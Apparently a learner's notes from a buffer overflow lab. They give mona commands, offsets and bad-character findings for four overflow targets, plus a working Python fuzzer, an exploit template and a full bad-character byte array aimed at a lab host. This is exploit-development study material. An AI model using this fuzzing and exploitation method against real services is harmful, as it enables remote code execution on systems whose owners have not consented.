

we overwrite memory with values unexpected to get in control of the machine 

to configure mona

!mona config -set workingfolder c:\mona\%p
!mona findmsp -distance 2400

using the fuzzer.py to know when it will crash 
Fuzzing crashed at 2000 bytes

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 ##creating a payload 

changing exploit.py payload value to the one we just generated 
after running it we get the value 

running !mona findmsp -distance 2400 to see where the crash happened 6F43396E

EIP offset 1978 and ESP 1982

sending exploit.py with retn to BBBB and the offset value to 1978 we get 42424242 as EIP now 
then we try to find the bad chars with mona 

!mona bytearray -b "Bad chars"
# OVERFLOW 1
!mona compare -f C:\mona\oscp\bytearray.bin -a *address* to compare between our list to see what are the bad chars 
now we have our bad chars let's try them 1 by 1 till we get all of them out 
Corruption after 6 bytes 00 07 08 2e 2f a0 a1 
00 07 2e 2f a0 a1
00 07 2e 2f a0 a1
00 07 2e 2f a0 a1
00 07 2e a0 ##our bad chars!!
well buffer overflow is kinda cool ntgl but complicated as fuck 
so let's do the other 9 xdd 

# OVERFLOW 2 
76413176 EIP on crash
EIP 634 ##offset
ESP 462
now let's do a retn BBBB to make sure we got it right 
and it's 42424242 so our values are right time to exploit 
time to check for bad chars
x23 x3c x83 xba

# OVERFLOW 3 
crashed at 1300 bytes so we created 1500 pattern chars with msf 
EIP 35714234
EIP offset is 1274 
ESP offset 1278
now let's run our BBBB rewrite
success 
let's find bad chars
running !mona compare -a esp -f c:\mona\oscp\bytearray.bin we get 
00 11 12 40 41 5F 60 b8 
00 11 40 41 5F 60 b8 b9 
00 11 40 5F 60 B8 B9 ee 
00 11 40 5F B8 B9 ee EF
00 11 40 5F b8 EE EF 
00 11 40 5F B8 EE
Done!!
let's try to get [[Reverse Shells]] on this one 
!mona jmp -r esp -cpb "\x00\x11\x40\x5F\xB8\xEE" to find our jmp 
0x62501203 ##our jmp \x03\x12\x50\x62
and adding padding    padding = "\x90" * 16
and we are root!


# OVERFLOW 4 
crashed on 2100 bytes
EIP 70433570
EIP offset  2026
ESP offset 2030
now BBBB test 
success 
now to bad chars 

\x00\xa9\xcd\xd4

	
# Fuzzer.py
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.252.204"

port = 1337
timeout = 5
prefix = "OVERFLOW3 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

# Exploit.py

import socket

ip = "10.10.252.204"
port = 1337

prefix = "OVERFLOW4 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
  
  

  
  
  !mona compare -a esp -f bytearray.bin
  
  # bad chars
  \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

  
  


